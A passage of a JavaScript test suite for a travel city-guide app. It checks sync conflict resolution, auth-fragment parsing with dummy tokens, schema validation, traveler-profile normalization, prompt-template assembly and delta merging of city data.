  assert.equal(n.updatedAt['yerevan-2026-08-15'], C.syncKit.EPOCH);
  assert.ok(!('ghost-city' in n.updatedAt));
  assert.deepEqual(Object.keys(n.updatedAt).sort(), n.order.slice().sort());
});
test('seeding a city stamps EPOCH, not now, so a real server row always wins', () => {
  // Mirrors both app-shell.html seed call sites (first-run seed and
  // re-seed-after-remove): CityOps.appStore.add(store, clone(SEED_CITY), CityOps.syncKit.EPOCH).
  const s = C.appStore.add(C.appStore.normalize(null), CITY_B, C.syncKit.EPOCH).store;
  assert.equal(s.updatedAt['batumi-2026-08-08'], C.syncKit.EPOCH);
});
test('syncKit.decide covers the full newer-wins matrix', () => {
  const A = '2026-08-11T09:00:00.000Z';   // older
  const B = '2026-08-11T10:00:00.000Z';   // newer
  assert.equal(C.syncKit.decide(null, null), 'noop');   // 1 nothing anywhere
  assert.equal(C.syncKit.decide(A, null), 'push');      // 2 local only
  assert.equal(C.syncKit.decide(null, A), 'pull');      // 3 remote only
  assert.equal(C.syncKit.decide(B, A), 'push');         // 4 local newer
  assert.equal(C.syncKit.decide(A, B), 'pull');         // 5 remote newer
  assert.equal(C.syncKit.decide(A, A), 'noop');         // 6 exact tie keeps local
  assert.equal(C.syncKit.decide('not a date', A), 'pull');  // 7 junk local = no local stamp
  assert.equal(C.syncKit.decide(A, 'not a date'), 'push');  // 8 junk remote = no remote row
  // 9 same instant, two dialects: PostgREST offset form vs device Z form.
  assert.equal(C.syncKit.decide('2026-08-11T09:00:00.000Z', '2026-08-11T09:00:00+00:00'), 'noop');
  // and the offset form still orders correctly against a later Z stamp
  assert.equal(C.syncKit.decide('2026-08-11T09:00:00+00:00', B), 'pull');
});
test('syncKit.plan splits both sides and never resurrects a session-removed city', () => {
  const A = '2026-08-11T09:00:00.000Z';
  const B = '2026-08-11T10:00:00.000Z';
  const p = C.syncKit.plan(
    { keep: A, newer: B, localonly: A, wasremoved: B },
    { keep: A, newer: A, remoteonly: A, wasremoved: A, ghost: A },
    { wasremoved: 1, ghost: 1 }
  );
  assert.deepEqual(p.push, ['localonly', 'newer', 'wasremoved']); // local newer wins even for a removed-but-still-present city
  assert.deepEqual(p.pull, ['remoteonly']);
  assert.deepEqual(p.noop, ['ghost', 'keep']); // ghost exists only remotely and was removed here: skipped
  assert.deepEqual(C.syncKit.plan(null, null, null), { push: [], pull: [], noop: [] });
});
test('syncKit.buildRows shapes upsert rows and never sends user_id', () => {
  const rows = C.syncKit.buildRows('data', [
    { cityId: 'batumi-2026-08-08', payload: CITY_B, updatedAt: '2026-08-11T09:00:00.000Z' },
    { cityId: 'nostamp-2026-01-01', payload: CITY_Y },
    { cityId: 'bad', payload: null },
    null
  ]);
  assert.equal(rows.length, 2);
  assert.deepEqual(Object.keys(rows[0]).sort(), ['city_id', 'data', 'updated_at']);
  assert.equal(rows[0].data.city.name, 'Batumi');
  assert.equal(rows[1].updated_at, C.syncKit.EPOCH);
  const st = C.syncKit.buildRows('state', [{ cityId: 'x', payload: C.emptyState(), updatedAt: '2026-08-11T09:00:00.000Z' }]);
  assert.deepEqual(Object.keys(st[0]).sort(), ['city_id', 'state', 'updated_at']);
});
test('syncKit.parseAuthHash reads a GoTrue fragment and rejects incomplete ones', () => {
  const now = Date.parse('2026-08-11T09:00:00.000Z');
  const s = C.syncKit.parseAuthHash(
    '#access_token=aaa.bbb.ccc&expires_in=3600&refresh_token=rrr&token_type=bearer&type=magiclink', now);
  assert.equal(s.access_token, 'aaa.bbb.ccc');
  assert.equal(s.refresh_token, 'rrr');
  assert.equal(s.token_type, 'bearer');
  assert.equal(s.expires_at, Math.floor(now / 1000) + 3600);
  assert.equal(s.email, '');
  // an explicit expires_at wins over expires_in
  assert.equal(C.syncKit.parseAuthHash('#access_token=a&refresh_token=r&expires_in=3600&expires_at=1800000000', now).expires_at, 1800000000);
  // email rides along when the fragment carries one (url-encoded)
  assert.equal(C.syncKit.parseAuthHash('#access_token=a&refresh_token=r&email=rob%40example.com', now).email, 'rob@example.com');
  // no expiry information at all: mark it already expired so first use refreshes
  assert.equal(C.syncKit.parseAuthHash('#access_token=a&refresh_token=r', now).expires_at, Math.floor(now / 1000));
  assert.equal(C.syncKit.parseAuthHash('#refresh_token=r&expires_in=3600', now), null);          // no access token
  assert.equal(C.syncKit.parseAuthHash('#access_token=a&expires_in=3600', now), null);           // no refresh token
  assert.equal(C.syncKit.parseAuthHash('#city=batumi-2026-08-08', now), null);                   // the app's own hash
  assert.equal(C.syncKit.parseAuthHash('#error=access_denied&error_description=expired', now), null);
  assert.equal(C.syncKit.parseAuthHash('', now), null);
  assert.equal(C.syncKit.parseAuthHash(null, now), null);
  assert.equal(C.syncKit.parseAuthHash('#####', now), null);
});
test('syncKit.sessionExpiringSoon guards the 60s window and every unreadable case', () => {
  const now = Date.parse('2026-08-11T09:00:00.000Z');
  const at = (offsetSec) => ({ access_token: 'a', expires_at: Math.floor(now / 1000) + offsetSec });
  assert.equal(C.syncKit.sessionExpiringSoon(at(3600), now), false);
  assert.equal(C.syncKit.sessionExpiringSoon(at(61), now), false);
  assert.equal(C.syncKit.sessionExpiringSoon(at(59), now), true);
  assert.equal(C.syncKit.sessionExpiringSoon(at(-1), now), true);
  assert.equal(C.syncKit.sessionExpiringSoon({ access_token: 'a', expires_at: String(Math.floor(now / 1000) + 3600) }, now), false); // string seconds
  assert.equal(C.syncKit.sessionExpiringSoon({ access_token: 'a', expires_at: now + 3600000 }, now), false); // milliseconds
  assert.equal(C.syncKit.sessionExpiringSoon({ access_token: 'a' }, now), true);   // no expiry
  assert.equal(C.syncKit.sessionExpiringSoon({ expires_at: now / 1000 + 3600 }, now), true); // no token
  assert.equal(C.syncKit.sessionExpiringSoon(null, now), true);
});

// Task 1: intel schema validation + export round trip
test('validate accepts a full intel block', () => {
  const data = clone(GOOD);
  data.items[0].intel = {
    verdicts: [
      { tier: 'must', text: 'Adjarian khachapuri, the boat with the egg' },
      { tier: 'good', text: 'Pkhali plate to share' },
      { tier: 'skip', text: 'The seafood platter: frozen, priced for tourists' }
    ],
    tips: [
      'Go before 13:00 or after 15:00 to skip the queue',
      'Cash only despite the sign; ATM two doors down'
    ],
    source: 'Aggregated from Google and TripAdvisor reviews, mid-2026'
  };
  assert.deepEqual(C.validate(data), []);
});
test('validate accepts an item with no intel at all', () => {
  assert.deepEqual(C.validate(GOOD), []);
});
test('validate rejects a bad intel tier', () => {
  const data = clone(GOOD);
  data.items[0].intel = { verdicts: [{ tier: 'meh', text: 'Something' }] };
  const errs = C.validate(data);
  assert.ok(errs.some(e => /items\[0\] \(brasserie\) intel: verdicts\[0\] tier/.test(e)));
});
test('validate rejects an empty verdict text', () => {
  const data = clone(GOOD);
  data.items[0].intel = { verdicts: [{ tier: 'must', text: '  ' }] };
  const errs = C.validate(data);
  assert.ok(errs.some(e => /intel: verdicts\[0\] needs non-empty text/.test(e)));
});
test('validate rejects non-array verdicts and non-array tips', () => {
  const data = clone(GOOD);
  data.items[0].intel = { verdicts: 'must: khachapuri', tips: 'go early' };
  const errs = C.validate(data);
  assert.ok(errs.some(e => /intel: verdicts must be an array/.test(e)));
  assert.ok(errs.some(e => /intel: tips must be an array/.test(e)));
});
test('validate rejects a non-empty-string tip and a non-string source', () => {
  const data = clone(GOOD);
  data.items[0].intel = { tips: ['', 'fine'], source: 42 };
  const errs = C.validate(data);
  assert.ok(errs.some(e => /intel: tips\[0\] must be a non-empty string/.test(e)));
  assert.ok(errs.some(e => /intel: source must be a string/.test(e)));
});
test('validate rejects a non-object intel', () => {
  const data = clone(GOOD);
  data.items[0].intel = 'must: khachapuri';
  let errs = C.validate(data);
  assert.ok(errs.some(e => /items\[0\] \(brasserie\) intel: must be an object/.test(e)));
  data.items[0].intel = ['must: khachapuri'];
  errs = C.validate(data);
  assert.ok(errs.some(e => /intel: must be an object/.test(e)));
  data.items[0].intel = null;
  errs = C.validate(data);
  assert.deepEqual(errs, []); // null/undefined intel is treated as absent
});
test('buildExport round trip with intel present deep-equals', () => {
  const data = clone(GOOD);
  data.items[0].intel = {
    verdicts: [
      { tier: 'must', text: 'Adjarian khachapuri' },
      { tier: 'skip', text: 'Seafood platter' }
    ],
    tips: ['Go before 13:00'],
    source: 'Reviews, mid-2026'
  };
  assert.deepEqual(C.validate(data), []);
  const st = C.emptyState();
  const out = C.buildExport(data, st);
  assert.deepEqual(out.items.find(i => i.id === 'brasserie').intel, data.items[0].intel);
  const again = C.buildExport(C.parse(JSON.stringify(out)).data, C.emptyState());
  assert.deepEqual(again, out);
});

// Task 2: interest profile + prompt assembly
test('profile.normalize returns the empty shape for junk input', () => {
  const empty = { schema: 1, interests: [], avoid: [], factors: [], notes: '', showExample: false, updated: null };
  assert.deepEqual(C.profile.normalize(null), empty);
  assert.deepEqual(C.profile.normalize(undefined), empty);
  assert.deepEqual(C.profile.normalize('nope'), empty);
  assert.deepEqual(C.profile.normalize([1, 2]), empty);
  assert.deepEqual(C.profile.normalize({ interests: 'climbing', avoid: 7, notes: 42 }), empty);
});
test('profile.normalize trims, drops empties, dedupes case-insensitively keeping the first', () => {
  const p = C.profile.normalize({
    interests: ['  climbing gyms ', 'Climbing Gyms', '', '   ', 'live jazz', 12, null, 'LIVE JAZZ'],
    avoid: ['Nightclubs', 'nightclubs '],
    notes: '   Vegetarian most days.   '
  });
  assert.deepEqual(p.interests, ['climbing gyms', 'live jazz']);
  assert.deepEqual(p.avoid, ['Nightclubs']);
  assert.equal(p.notes, 'Vegetarian most days.');
  assert.equal(p.schema, 1);
  assert.equal(p.updated, null);
});
test('profile.normalize caps each list at 30 and notes at 2000 chars', () => {
  const many = [];
  for (let i = 0; i < 45; i++) many.push('interest ' + i);
  const p = C.profile.normalize({ interests: many, avoid: many, notes: 'x'.repeat(2500) });
  assert.equal(p.interests.length, 30);
  assert.equal(p.interests[29], 'interest 29');
  assert.equal(p.avoid.length, 30);
  assert.equal(p.notes.length, 2000);
});
test('profile.normalize keeps a string updated stamp and rejects anything else', () => {
  assert.equal(C.profile.normalize({ updated: '2026-08-12T10:00:00Z' }).updated, '2026-08-12T10:00:00Z');
  assert.equal(C.profile.normalize({ updated: 12345 }).updated, null);
  assert.equal(C.profile.normalize({ updated: '' }).updated, null);
});
test('profile.isEmpty ignores the stamp and sees any real content', () => {
  assert.equal(C.profile.isEmpty(null), true);
  assert.equal(C.profile.isEmpty({ updated: '2026-08-12T10:00:00Z' }), true);
  assert.equal(C.profile.isEmpty({ interests: ['   '] }), true);
  assert.equal(C.profile.isEmpty({ interests: ['live jazz'] }), false);
  assert.equal(C.profile.isEmpty({ avoid: ['nightclubs'] }), false);
  assert.equal(C.profile.isEmpty({ notes: 'Vegetarian' }), false);
});
test('appStore.normalize carries a normalized profile and survives add/remove', () => {
  const empty = C.appStore.normalize(null);
  assert.deepEqual(empty.profile, { schema: 1, interests: [], avoid: [], factors: [], notes: '', showExample: false, updated: null });
  let s = C.appStore.normalize({ profile: { interests: ['live jazz', 'LIVE JAZZ'], notes: ' walks a lot ' } });
  assert.deepEqual(s.profile.interests, ['live jazz']);
  assert.equal(s.profile.notes, 'walks a lot');
  s = C.appStore.add(s, CITY_B).store;
  assert.deepEqual(s.profile.interests, ['live jazz']);
  s = C.appStore.remove(s, 'batumi-2026-08-08');
  assert.deepEqual(s.profile.interests, ['live jazz']);
});
// ---- Phase 2, Feature 1: planning factors (part 1: shape, no template needed) ----
test('profile.FACTOR_LEVELS is the exact five-point scale', () => {
  assert.deepEqual(C.profile.FACTOR_LEVELS, ['blocker', 'very important', 'medium', 'low', 'not important']);
});
test('profile.defaultFactors seeds 7 sensible factors at medium and hands out a fresh array each call', () => {
  const a = C.profile.defaultFactors();
  const b = C.profile.defaultFactors();
  assert.equal(a.length, 7);
  assert.ok(a.every((f) => f.level === 'medium' && f.custom === false));
  assert.ok(a.some((f) => f.label === 'Walkability'));
  a[0].level = 'blocker';
  assert.equal(b[0].level, 'medium'); // mutating one caller's array never touches another's
});
test('profile.normalizeFactors drops bad levels and junk, dedupes by label, assigns slug ids', () => {
  const out = C.profile.normalizeFactors([
    { label: 'Nightlife', level: 'blocker' },
    { label: '  Nightlife ', level: 'medium' },       // dup label, dropped
    { label: 'Safety', level: 'not a level' },          // bad level, dropped
    { label: '', level: 'low' },                        // no label, dropped
    'nope',                                              // not an object, dropped
    { label: 'Food Scene', level: 'very important', custom: true }
  ]);
  assert.deepEqual(out, [
    { id: 'nightlife', label: 'Nightlife', level: 'blocker', custom: false },
    { id: 'food-scene', label: 'Food Scene', level: 'very important', custom: true }
  ]);
});
test('profile.normalizeFactors dedupes id collisions from different labels', () => {
  const out = C.profile.normalizeFactors([
    { label: 'Café!', level: 'medium' },
    { label: 'Café?', level: 'low' }
  ]);
  assert.deepEqual(out.map((f) => f.id), ['caf', 'caf-2']);
});
test('profile.normalizeFactors caps at 30', () => {
  const many = [];
  for (let i = 0; i < 45; i++) many.push({ label: 'factor ' + i, level: 'medium' });
  assert.equal(C.profile.normalizeFactors(many).length, 30);
});
test('profile.normalize carries factors through and profile.isEmpty counts them', () => {
  const p = C.profile.normalize({ factors: [{ label: 'Safety', level: 'blocker' }] });
  assert.deepEqual(p.factors, [{ id: 'safety', label: 'Safety', level: 'blocker', custom: false }]);
  assert.equal(C.profile.isEmpty(p), false);
  assert.equal(C.profile.isEmpty({ factors: [] }), true);
});

// ---- Phase 2, Feature 2: shared JSON-fence extraction ----
test('extractJsonBlock finds a ```json fence and returns its trimmed, parseable body', () => {
  const md = 'Here is the guide:\n\n```json\n' + JSON.stringify(GOOD) + '\n```\n';
  assert.deepEqual(JSON.parse(C.extractJsonBlock(md)), GOOD);
});
test('extractJsonBlock accepts a bare fence with no json language tag', () => {
  const md = '```\n' + JSON.stringify(GOOD) + '\n```\n';
  assert.deepEqual(JSON.parse(C.extractJsonBlock(md)), GOOD);
});
test('extractJsonBlock skips a non-JSON fence and finds a later one that parses', () => {
  const md = '```bash\nnpm install\n```\n\n```json\n' + JSON.stringify(GOOD) + '\n```\n';
  assert.deepEqual(JSON.parse(C.extractJsonBlock(md)), GOOD);
});
test('extractJsonBlock returns null when nothing in the text parses as JSON', () => {
  assert.equal(C.extractJsonBlock('Sorry, ran out of room, ask me for the JSON separately.'), null);
  assert.equal(C.extractJsonBlock(''), null);
});
test('RETRY_INSTRUCTION is the shared re-ask message the CLI and the app both show', () => {
  assert.ok(/reply with the full city guide as a single/.test(C.RETRY_INSTRUCTION));
});

// ---- No-paste import: isJsonSyntaxError + fetchTextToCity (pure) ----
test('isJsonSyntaxError is true only for a lone JSON-parse error', () => {
  assert.equal(C.isJsonSyntaxError(C.parse('{ nope').errors), true);
  const bad = clone(GOOD);
  bad.schema = 2;
  assert.equal(C.isJsonSyntaxError(C.parse(JSON.stringify(bad)).errors), false); // schema errors, not a syntax error
  assert.equal(C.isJsonSyntaxError([]), false);
  assert.equal(C.isJsonSyntaxError(null), false);
});
test('fetchTextToCity: direct valid JSON succeeds with kind ok', () => {
  const res = C.fetchTextToCity(JSON.stringify(GOOD));
  assert.equal(res.kind, 'ok');
  assert.equal(res.data.city.name, 'Batumi');
  assert.deepEqual(res.errors, []);
});
test('fetchTextToCity: valid JSON that fails schema is kind invalid, no fence fallback attempted', () => {
  const bad = clone(GOOD);
  bad.schema = 2;
  const res = C.fetchTextToCity(JSON.stringify(bad));
  assert.equal(res.kind, 'invalid');
  assert.equal(res.data, null);
  assert.ok(res.errors.some((e) => /schema must be 1/.test(e)));
});
test('fetchTextToCity: not JSON at all, and no fenced JSON either, is kind not-json', () => {
  const res = C.fetchTextToCity('Sorry, I ran out of room. Ask me again.');
  assert.equal(res.kind, 'not-json');
  assert.equal(res.data, null);
});
test('fetchTextToCity: a raw .md guide falls back to the fenced JSON block and succeeds', () => {
  const md = 'Here is your guide:\n\n```json\n' + JSON.stringify(GOOD) + '\n```\n';
  const res = C.fetchTextToCity(md);
  assert.equal(res.kind, 'ok');
  assert.equal(res.data.city.name, 'Batumi');
});
test('fetchTextToCity: a fenced block that parses but fails schema is kind invalid', () => {
  const bad = clone(GOOD);
  bad.items[0].status = 'someday';
  const md = 'notes before\n```json\n' + JSON.stringify(bad) + '\n```\nnotes after';
  const res = C.fetchTextToCity(md);
  assert.equal(res.kind, 'invalid');
  assert.ok(res.errors.some((e) => /bad status/.test(e)));
});
test('fetchTextToCity: empty text is not-json, not a thrown error', () => {
  const res = C.fetchTextToCity('');
  assert.equal(res.kind, 'not-json');
  assert.equal(res.data, null);
});
test('cities/index.json lists every bundled city, each file present and valid', () => {
  const fs = require('fs');
  const path = require('path');
  const root = path.join(__dirname, '..');
  const manifest = JSON.parse(fs.readFileSync(path.join(root, 'cities', 'index.json'), 'utf8'));
  assert.ok(Array.isArray(manifest.cities) && manifest.cities.length >= 1);
  const bundled = fs.readdirSync(path.join(root, 'cities')).filter((f) => f.endsWith('.json') && f !== 'index.json');
  assert.deepEqual(manifest.cities.map((c) => c.file).sort(), bundled.sort());
  manifest.cities.forEach((c) => {
    assert.ok(c.name && typeof c.name === 'string');
    assert.ok(c.dates && typeof c.dates === 'string');
    const res = C.parse(fs.readFileSync(path.join(root, 'cities', c.file), 'utf8'));
    assert.deepEqual(res.errors, []);
    assert.equal(res.data.city.name, c.name, c.file + ' manifest name must match the city JSON');
  });
});

// ---- Phase 2, Feature 3: example-city visibility ----
test('appStore.exampleVisible shows the example when there are no real cities yet', () => {
  assert.equal(C.appStore.exampleVisible([], 'example-seed', false), true);
  assert.equal(C.appStore.exampleVisible(['example-seed'], 'example-seed', false), true);
});
test('appStore.exampleVisible hides the example once a real city exists, unless the toggle is on', () => {
  assert.equal(C.appStore.exampleVisible(['example-seed', 'batumi-2026-08-08'], 'example-seed', false), false);
  assert.equal(C.appStore.exampleVisible(['example-seed', 'batumi-2026-08-08'], 'example-seed', true), true);
});
test('appStore.exampleVisible treats a missing/undefined id list as no real cities', () => {
  assert.equal(C.appStore.exampleVisible(undefined, 'example-seed', false), true);
});

test('promptKit.INTERESTS_SECTION is the ninth section descriptor', () => {
  assert.deepEqual(C.promptKit.INTERESTS_SECTION, { id: 'interests', label: 'My interests', icon: '⭐' });
});

// A small stand-in for PROMPT.md carrying the same landmark lines the builder
// edits, so these assertions test the assembly and not the wording of the file.
const FAKE_PROMPT = [
  '# CityOps generation prompt',
  '',
  C.promptKit.COPY_LINE,
  '',
  '---',
  '',
  '## Trip details',
  '',
  '- **City:** [city name]',
  '- **Country:** [country, ISO 2-letter code if you know it, e.g. GE, AM]',
  '- **Dates:** [arrival date] to [departure date], ISO format (YYYY-MM-DD)',
  '- **Accommodation:** [name of hotel/apartment/building], [full address]',
  '- **Arrival transport:** [flight/train/etc, arrival time if known]',
  '- **Departure transport:** [flight/train/etc, departure time if known]',
  '',
  '## Traveler profile',
  '',
  'Solo traveler. Works mornings.',
  '',
  '[Add anything trip-specific here.]',
  '',
  '---',
  '',
  '## What I need',
  '',
  'Research this city.',
  ''
].join('\n');

const HEADER = {
  name: 'Tirana', country: 'AL', from: '2026-09-01', to: '2026-09-08',
  accommodation: 'Example Stay, 12 Example Street',
  arrival: 'XX 1234, lands 14:20', departure: 'XX 1235, 06:15'
};

test('buildCityPrompt fills every trip-details bullet and removes the copy-this-file line', () => {
  const out = C.promptKit.buildCityPrompt(FAKE_PROMPT, HEADER, null);
  assert.equal(out.indexOf(C.promptKit.COPY_LINE), -1);
  assert.ok(out.includes('- **City:** Tirana'));
  assert.ok(out.includes('- **Country:** AL'));
  assert.ok(out.includes('- **Dates:** 2026-09-01 to 2026-09-08, ISO format (YYYY-MM-DD)'));
  assert.ok(out.includes('- **Accommodation:** Example Stay, 12 Example Street'));
  assert.ok(out.includes('- **Arrival transport:** XX 1234, lands 14:20'));
  assert.ok(out.includes('- **Departure transport:** XX 1235, 06:15'));
  // Untouched body text and the traveler-profile bracket both survive.
  assert.ok(out.includes('[Add anything trip-specific here.]'));
  assert.ok(out.includes('Research this city.'));
});
test('buildCityPrompt leaves a placeholder wherever the value is empty', () => {
  const out = C.promptKit.buildCityPrompt(FAKE_PROMPT, { name: 'Tirana', from: '2026-09-01' }, null);
  assert.ok(out.includes('- **City:** Tirana'));
  assert.ok(out.includes('- **Country:** [country, ISO 2-letter code if you know it, e.g. GE, AM]'));
  assert.ok(out.includes('- **Dates:** 2026-09-01 to [departure date], ISO format (YYYY-MM-DD)'));
  assert.ok(out.includes('- **Accommodation:** [name of hotel/apartment/building], [full address]'));
  assert.ok(out.includes('- **Arrival transport:** [flight/train/etc, arrival time if known]'));
  const none = C.promptKit.buildCityPrompt(FAKE_PROMPT, null, null);
  assert.ok(none.includes('- **City:** [city name]'));
});
test('buildCityPrompt inserts the interests block after the traveler profile', () => {
  const out = C.promptKit.buildCityPrompt(FAKE_PROMPT, HEADER, {
    interests: ['climbing gyms', 'live jazz'],
    avoid: ['nightclubs'],
    notes: 'Vegetarian most days.'
  });
  assert.ok(out.includes('## Traveler interests'));
  assert.ok(out.includes('Add a ninth section for these interests as described under Interests below.'));
  assert.ok(out.includes('- climbing gyms'));
  assert.ok(out.includes('- live jazz'));
  assert.ok(out.includes('- nightclubs'));
  assert.ok(out.includes('Notes: Vegetarian most days.'));
  // Placement: after the traveler-profile bracket, before the rule that closes
  // the header, and therefore before "What I need".
  assert.ok(out.indexOf('[Add anything trip-specific here.]') < out.indexOf('## Traveler interests'));
  assert.ok(out.indexOf('## Traveler interests') < out.indexOf('## What I need'));
  assert.ok(out.indexOf('## Traveler interests') < out.lastIndexOf('\n---'));
});
test('buildCityPrompt omits empty halves of the interests block', () => {
  const only = C.promptKit.buildCityPrompt(FAKE_PROMPT, HEADER, { interests: ['live jazz'] });
  assert.ok(only.includes('Interests, in priority order:'));
  assert.equal(only.indexOf('Avoid, do not suggest any of these:'), -1);
  assert.equal(only.indexOf('Notes:'), -1);
});
test('buildCityPrompt inserts nothing at all when the profile is empty', () => {
  [null, undefined, {}, { interests: [], avoid: [], notes: '  ' }, { updated: '2026-08-12T10:00:00Z' }]
    .forEach((p) => {
      const out = C.promptKit.buildCityPrompt(FAKE_PROMPT, HEADER, p);
      assert.equal(out.indexOf('## Traveler interests'), -1);
      assert.equal(out.indexOf('Add a ninth section'), -1);
    });
});
test('buildCityPrompt never mutates its inputs and tolerates a bare template', () => {
  const before = FAKE_PROMPT;
  const p = { interests: ['live jazz'] };
  C.promptKit.buildCityPrompt(FAKE_PROMPT, HEADER, p);
  assert.equal(FAKE_PROMPT, before);
  assert.deepEqual(p, { interests: ['live jazz'] });
  assert.equal(C.promptKit.buildCityPrompt('', HEADER, null), '');
  // No traveler-profile landmark: the block still lands, ahead of What I need.
  const bare = '## What I need\n\nResearch this city.\n';
  const out = C.promptKit.buildCityPrompt(bare, HEADER, { interests: ['live jazz'] });
  assert.ok(out.indexOf('## Traveler interests') < out.indexOf('## What I need'));
});
// ---- Phase 2, Feature 1 (part 2): factors and trip notes inside the real prompt shape ----
test('buildCityPrompt phrases blocker factors as hard exclusions and the rest as weighted preferences, strongest first', () => {
  const out = C.promptKit.buildCityPrompt(FAKE_PROMPT, HEADER, {
    factors: [
      { label: 'Nightlife', level: 'low' },
      { label: 'Safety', level: 'blocker' },
      { label: 'Walkability', level: 'very important' },
      { label: 'Food scene', level: 'not important' },
      { label: 'Transit quality', level: 'medium' }
    ]
  });
  assert.ok(out.includes('Hard exclusions'));
  assert.ok(out.includes('- Safety'));
  assert.ok(out.includes('Weighted preferences'));
  assert.ok(out.includes('- Walkability (very important)'));
  assert.ok(out.includes('- Transit quality (medium)'));
  assert.ok(out.includes('- Nightlife (low)'));
  // not important is left out entirely, not listed with a "no preference" line
  assert.equal(out.indexOf('Food scene'), -1);
  // strongest-first ordering
  assert.ok(out.indexOf('Walkability (very important)') < out.indexOf('Transit quality (medium)'));
  assert.ok(out.indexOf('Transit quality (medium)') < out.indexOf('Nightlife (low)'));
});
test('buildCityPrompt with only planning factors still inserts the Traveler interests block', () => {
  const out = C.promptKit.buildCityPrompt(FAKE_PROMPT, HEADER, {
    factors: [{ label: 'Safety', level: 'blocker' }]
  });
  assert.ok(out.includes('## Traveler interests'));
});
test('buildCityPrompt fills the trip-specific bracket paragraph from header.notes', () => {
  const out = C.promptKit.buildCityPrompt(FAKE_PROMPT, { name: 'Tirana', notes: 'Vegetarian, prefers walking everywhere.' }, null);
  assert.ok(out.includes('Vegetarian, prefers walking everywhere.'));
  assert.equal(out.indexOf('[Add anything trip-specific here'), -1);
});
test('buildCityPrompt leaves the trip-specific bracket alone when notes is empty', () => {
  const out = C.promptKit.buildCityPrompt(FAKE_PROMPT, { name: 'Tirana' }, null);
  assert.ok(out.includes('[Add anything trip-specific here.]'));
});

test('index.html embeds PROMPT.md verbatim, escaped and reversible; template.html carries none of it', () => {
  const fs = require('fs');
  const path = require('path');
  const root = path.join(__dirname, '..');
  const idx = fs.readFileSync(path.join(root, 'index.html'), 'utf8');
  const m = idx.match(/<script type="text\/plain" id="prompt-template">\n([\s\S]*?)\n<\/script>/);
  assert.ok(m, 'prompt-template block missing or closed early');
  assert.equal(m[1].indexOf('</script'), -1);   // a raw close tag would end the block
  // Exactly the unescape the app performs when it reads the block.
  const un = m[1].replace(/<\\\/script/g, '</script');
  assert.equal(un, fs.readFileSync(path.join(root, 'PROMPT.md'), 'utf8'));
  // Standalone guides are app-free: no prompt template, no builders.
  const tpl = fs.readFileSync(path.join(root, 'template.html'), 'utf8');
  assert.equal(tpl.indexOf('prompt-template'), -1);
});
test('syncKit.decide drives the profile reconcile the same way it drives cities', () => {
  // The app shell reconciles the profile with decide(local.updated, remote.updated_at).
  const local = '2026-08-12T10:00:00.000Z';
  const remote = '2026-08-12T11:00:00+00:00';
  assert.equal(C.syncKit.decide(local, remote), 'pull');
  assert.equal(C.syncKit.decide(remote, local), 'push');
  assert.equal(C.syncKit.decide(local, null), 'push');   // never synced: send it up
  assert.equal(C.syncKit.decide(null, remote), 'pull');  // never edited here: take theirs
  assert.equal(C.syncKit.decide(null, null), 'noop');    // never edited anywhere: nothing to do
});

// ---- Task 3: mergeDelta ----

const DELTA = {
  schema: 1,
  delta: true,
  sections: [{ id: 'interests', label: 'My interests', icon: '⭐' }],
  items: [
    { id: 'boulder', section: 'interests', status: 'plan', name: 'Boulder Hall',
      links: [], place_id: null, verified: null },
    { id: 'jazzve', section: 'coffee', status: 'backup', name: 'Jazzve', links: [] }
  ],
  intel: {
    brasserie: {
      verdicts: [{ tier: 'must', text: 'Adjarian khachapuri' }],
      tips: ['Go before 13:00'],
      source: 'Aggregated from Google reviews, mid-2026'
    }
  }
};

test('mergeDelta adds new items and new sections and counts them', () => {
  const r = C.mergeDelta(GOOD, clone(DELTA));
  assert.deepEqual(r.errors, []);
  assert.deepEqual(r.summary, { added: 2, skipped: 0, sectionsAdded: 1, intelApplied: 1, intelSkipped: 0, ratingsApplied: 0, ratingsSkipped: 0 });
  assert.equal(r.data.sections.length, 3);
  assert.equal(r.data.sections[2].id, 'interests');   // appended, never reordered
  assert.equal(r.data.items.length, GOOD.items.length + 2);
  const added = r.data.items.filter((it) => it.id === 'boulder' || it.id === 'jazzve');
  assert.equal(added.length, 2);
  // place_id/verified are normalized to null when the payload omits them.
  const jazzve = r.data.items.find((it) => it.id === 'jazzve');
  assert.equal(jazzve.place_id, null);
  assert.equal(jazzve.verified, null);
});

test('mergeDelta skips an id that already exists instead of overwriting it', () => {
  const d = clone(DELTA);
  d.items.push({ id: 'brasserie', section: 'dinner', status: 'plan', name: 'Impostor', links: [] });
  const r = C.mergeDelta(GOOD, d);
  assert.deepEqual(r.errors, []);
  assert.equal(r.summary.added, 2);
  assert.equal(r.summary.skipped, 1);
  const kept = r.data.items.filter((it) => it.id === 'brasserie');
  assert.equal(kept.length, 1);
  assert.equal(kept[0].name, 'Brasserie 1900');       // the traveler's copy wins
  assert.equal(kept[0].note, '4.8 stars, reserve.');  // and nothing else moved
});

test('mergeDelta applied twice is a no-op: everything is already there', () => {
  const first = C.mergeDelta(GOOD, clone(DELTA));
  const second = C.mergeDelta(first.data, clone(DELTA));
  assert.deepEqual(second.errors, []);
  assert.deepEqual(second.summary,
    { added: 0, skipped: 2, sectionsAdded: 0, intelApplied: 1, intelSkipped: 0, ratingsApplied: 0, ratingsSkipped: 0 });
  assert.deepEqual(second.data, first.data);
});

test('mergeDelta ignores an existing section id rather than overwriting its label', () => {
  const d = { schema: 1, delta: true, sections: [{ id: 'dinner', label: 'Renamed by the AI' }] };
  const r = C.mergeDelta(GOOD, d);
  assert.deepEqual(r.errors, []);
  assert.equal(r.summary.sectionsAdded, 0);
  assert.equal(r.data.sections.length, 2);
  assert.equal(r.data.sections[0].label, 'Dinner');
});

test('mergeDelta rejects duplicate ids within one delta', () => {
  const d = clone(DELTA);
  d.items.push({ id: 'boulder', section: 'interests', status: 'plan', name: 'Twin', links: [] });
  const r = C.mergeDelta(GOOD, d);
  assert.equal(r.data, null);
  assert.ok(r.errors.some((e) => /duplicate item id "boulder"/.test(e)));
});

test('mergeDelta rejects a bad envelope, unknown section, done status and bad intel', () => {
  const bad = (patch) => C.mergeDelta(GOOD, Object.assign(clone(DELTA), patch));
  assert.ok(bad({ schema: 2 }).errors.some((e) => /schema must be 1/.test(e)));
  assert.ok(bad({ delta: false }).errors.some((e) => /delta must be true/.test(e)));
  assert.ok(bad({ delta: undefined }).errors.some((e) => /delta must be true/.test(e)));
  assert.equal(C.mergeDelta(GOOD, null).data, null);
  assert.equal(C.mergeDelta(null, clone(DELTA)).data, null);
  assert.equal(C.mergeDelta(GOOD, 'nope').data, null);

  const unknown = bad({ sections: undefined });   // boulder's section no longer exists
  assert.equal(unknown.data, null);
  assert.ok(unknown.errors.some((e) => /unknown section "interests"/.test(e)));

